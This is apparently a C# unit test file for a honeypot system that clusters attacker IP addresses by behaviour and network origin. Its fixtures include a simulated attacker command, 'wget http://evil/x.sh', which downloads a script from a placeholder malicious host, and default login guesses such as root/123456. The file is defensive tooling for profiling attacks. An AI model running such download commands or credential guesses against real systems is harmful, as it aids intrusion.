using HoneyGrid.Contracts;
using HoneyGrid.Functions.Profiling;

namespace HoneyGrid.Functions.Tests;

public class ActorClusteringTests
{
    private static IReadOnlyList<ActorFingerprint> Fingerprints(params HoneypotEvent[] events) =>
        FingerprintBuilder.FromEvents(events);

    [Fact]
    public void Two_ips_with_identical_behaviour_and_infra_cluster_together()
    {
        var fps = Fingerprints(
            TestEvents.Event("1.1.1.1", EventType.Command, command: "wget http://evil/x.sh", asn: "AS1", country: "CN"),
            TestEvents.Event("1.1.1.1", username: "root", password: "123456", asn: "AS1", country: "CN"),
            TestEvents.Event("2.2.2.2", EventType.Command, command: "wget http://evil/x.sh", asn: "AS1", country: "CN"),
            TestEvents.Event("2.2.2.2", username: "root", password: "123456", asn: "AS1", country: "CN"));

        var clusters = ActorClustering.Cluster(fps);

        Assert.Single(clusters);
        Assert.Equal(2, clusters[0].Count);
    }

    [Fact]
    public void Behaviourally_distinct_sources_stay_separate()
    {
        var fps = Fingerprints(
            TestEvents.Event("1.1.1.1", EventType.Command, command: "wget http://evil/x.sh", asn: "AS1", country: "CN"),
            TestEvents.Event("9.9.9.9", EventType.HttpRequest, asn: "AS2", country: "US", sensorType: SensorType.Web,
                timestamp: new DateTimeOffset(2026, 6, 1, 18, 0, 0, TimeSpan.Zero)));

        var clusters = ActorClustering.Cluster(fps);

        Assert.Equal(2, clusters.Count);
    }

    [Fact]
    public void Similarity_is_symmetric()
    {
        var fps = Fingerprints(
            TestEvents.Event("1.1.1.1", username: "root", password: "123456", asn: "AS1", country: "CN"),
            TestEvents.Event("2.2.2.2", username: "admin", password: "admin", asn: "AS2", country: "RU"));

        var ab = ActorClustering.Similarity(fps[0], fps[1]);
        var ba = ActorClustering.Similarity(fps[1], fps[0]);

        Assert.Equal(ab, ba, precision: 9);
    }

    [Fact]
    public void Clustering_is_deterministic_regardless_of_input_order()
    {
        var a = TestEvents.Event("1.1.1.1", username: "root", password: "123456", asn: "AS1", country: "CN");
        var b = TestEvents.Event("2.2.2.2", username: "root", password: "123456", asn: "AS1", country: "CN");
        var c = TestEvents.Event("9.9.9.9", EventType.HttpRequest, asn: "AS2", country: "US", sensorType: SensorType.Web,
            timestamp: new DateTimeOffset(2026, 6, 1, 18, 0, 0, TimeSpan.Zero));

        var forward = ActorClustering.Cluster(FingerprintBuilder.FromEvents([a, b, c])).Count;
        var reverse = ActorClustering.Cluster(FingerprintBuilder.FromEvents([c, b, a])).Count;

        Assert.Equal(forward, reverse);
    }
}
